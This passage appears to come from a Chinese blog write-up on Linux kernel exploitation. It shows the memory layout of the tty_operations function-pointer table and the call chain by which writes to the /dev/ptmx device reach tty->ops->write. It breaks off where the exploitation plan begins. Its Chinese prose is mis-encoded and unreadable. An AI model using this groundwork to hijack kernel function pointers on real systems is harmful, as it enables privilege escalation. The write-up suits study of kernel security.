</span></span><span class="line"><span class="cl"><span class="cm">/*  128      |     8 */</span>    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">unthrottle</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  136      |     8 */</span>    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">stop</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  144      |     8 */</span>    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">start</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  152      |     8 */</span>    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">hangup</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  160      |     8 */</span>    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">break_ctl</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="p">,</span> <span class="kt">int</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  168      |     8 */</span>    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">flush_buffer</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  176      |     8 */</span>    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">set_ldisc</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  184      |     8 */</span>    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">wait_until_sent</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="p">,</span> <span class="kt">int</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  192      |     8 */</span>    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">send_xchar</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="p">,</span> <span class="kt">char</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  200      |     8 */</span>    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">tiocmget</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  208      |     8 */</span>    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">tiocmset</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  216      |     8 */</span>    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">resize</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="p">,</span> <span class="k">struct</span> <span class="n">winsize</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  224      |     8 */</span>    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">set_termiox</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="p">,</span> <span class="k">struct</span> <span class="n">termiox</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  232      |     8 */</span>    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">get_icount</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="p">,</span> <span class="k">struct</span> <span class="n">serial_icounter_struct</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  240      |     8 */</span>    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">poll_init</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_driver</span> <span class="o">*</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  248      |     8 */</span>    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">poll_get_char</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_driver</span> <span class="o">*</span><span class="p">,</span> <span class="kt">int</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  256      |     8 */</span>    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">poll_put_char</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_driver</span> <span class="o">*</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">char</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  264      |     8 */</span>    <span class="k">const</span> <span class="k">struct</span> <span class="n">file_operations</span> <span class="o">*</span><span class="n">proc_fops</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                           <span class="cm">/* total size (bytes):  272 */</span>
</span></span><span class="line"><span class="cl">                         <span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è€Œå¯¹æ‰“å¼€çš„<code>/dev/pmtx</code>è®¾å¤‡è¿›è¡Œè¯»å†™çš„æ—¶å€™ï¼Œæœ€åä¼šè°ƒç”¨è¯¥ç»“æ„ä½“ä¸­çš„å‡½æ•°æŒ‡é’ˆï¼Œä»¥<code>write</code>ä¸ºä¾‹ï¼Œè°ƒç”¨é“¾ä¸ºï¼š</p>
<ul>
<li>tty_write
<ul>
<li>do_tty_write
<ul>
<li>n_tty_write
<ul>
<li>tty-&gt;ops-&gt;write(tty, b, nr)</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>å½“ç„¶ï¼Œå‰é¢ä¼šæœ‰ä¸€ç³»åˆ—çš„æ ¡éªŒã€‚</p>
<p>æ­¤æ—¶çš„åˆ©ç”¨æ€è·¯ä¸ºï¼š</p>
<ul>
